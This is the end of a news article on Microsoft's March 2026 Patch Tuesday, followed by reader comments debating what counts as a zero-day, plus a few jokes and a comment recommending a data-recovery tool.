-For a complete breakdown of all the patches Microsoft released today, check out the SANS Internet Storm Center’s [Patch Tuesday post](https://isc.sans.edu/forums/diary/Microsoft%20Patch%20Tuesday%20March%202026/32782/). Windows enterprise admins who wish to stay abreast of any news about problematic updates, [AskWoody.com](https://www.askwoody.com) is always worth a visit. Please feel free to drop a comment below if you experience any issues apply this month’s patches.
-Contrary to this article, updates this month contain fixes for at least two publicly acknowledged zero days.
-Really? Which two? IDK how you define zero-day, but for me it’s an unpatched and actively exploited vulnerability. As mentioned in the story, there were two flaws fixed this month that were previously disclosed publicly. I believe in both cases there was not even sample exploit code involved.
-I’m just going off every other news outlet reporting. Bleeping computer, for example, stated “This month’s Patch Tuesday fixes two publicly disclosed zero-day vulnerabilities, with none of them known to be exploited in attacks. Microsoft classifies a zero-day flaw as publicly disclosed or actively exploited while no official fix is available.” ¯\_(ツ)_/¯
-Okay. Thanks for pointing that out. I wonder why Microsoft would call it zero-day when they’re not aware of exploitation; doesn’t seem to suit their interests to do so. I’ve always believed that calling bugs 0day just because someone detailed a vulnerability (without providing examples of how to exploit them) publicly is unnecessarily alarmist. Real zero-days are a call for greater urgency, IMHO.
-I think Microsoft likes to call them zero day when they feel the exploit is available even though nobody is currently using it. But then again maybe Microsoft knows something nobody else does? Is it one of those deals where it depends on who is releasing these security descriptors for the updates? One person calls them zero day the other something less dire? I saw the Bleeping Computer release too. They said the 2 zero-day ones were publicly disclosed. Not actively exploited. I guess sort of splitting hairs there.
-That sounds pretty accurate. I think “zero-day” is defined and communicated differently throughout different organizations. Technically, a zero-day is any vulnerability that was unknown to the vendor before it became public. That doesn’t necessarily mean it’s being actively exploited. Microsoft uses “zero-day” as a broad label, then clarifies whether it’s actively exploited or just publicly disclosed. Other sources, like BleepingComputer, tend to separate those more clearly, which can make things less confusing. A publicly disclosed zero-day increases risk, but an actively exploited one is far more urgent since attackers are already using it in real-world attacks.
-I don’t know if they know what they’re talking about, but Lifehacker reported there are two:
-https://lifehacker.com/tech/microsoft-patch-tuesday-march-2026#:~:text=Two%20publicly%20disclosed%20zero%2Ddays%20for%20this%20Patch%20Tuesday
-Looking for a patch for the chicken parm with panko and tagliatelle exploit. It’s two cascaded exploits, both leading to escalation followed by a ring three rk installation. 2021-2023/early 2024. Originating attacker from Ramat Gan.
-Gnarly beach.
-I had the same discussion with my coworker, who used CoPilot to summarize and the previously disclosed findings were included in the response because the patch is included in this month’s bundle. Strictly speaking anything previously published is no longer a “zero day” as far as I know, but it’s genesis stays with it.
-I mean, any bug, prior to being disclosed, is at some point a ‘zero-day’ bug. AFAIK, it ceases being an 0-day the minute it is disclosed, yah?
-Have they heard about two-factor authentication? They were obviously phished. Maybe put TFA in place now.
-Lol at the roughy in your article! You criminal mastermind, Keir!
-Keep a close eye on that .NET vulnerability (CVE-2026-26127). If a machine crashes hard mid-update, it frequently corrupts the Master File Table. We always see a spike in ‘RAW’ or unbootable drives right after Patch Tuesday rollups go sideways. If you end up with an inaccessible drive this week, don’t immediately wipe it. Run a block-level scan with a tool like Stellar Data Recovery first, it bypasses the scrambled partition table to pull the raw files, which are almost always still intact.</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
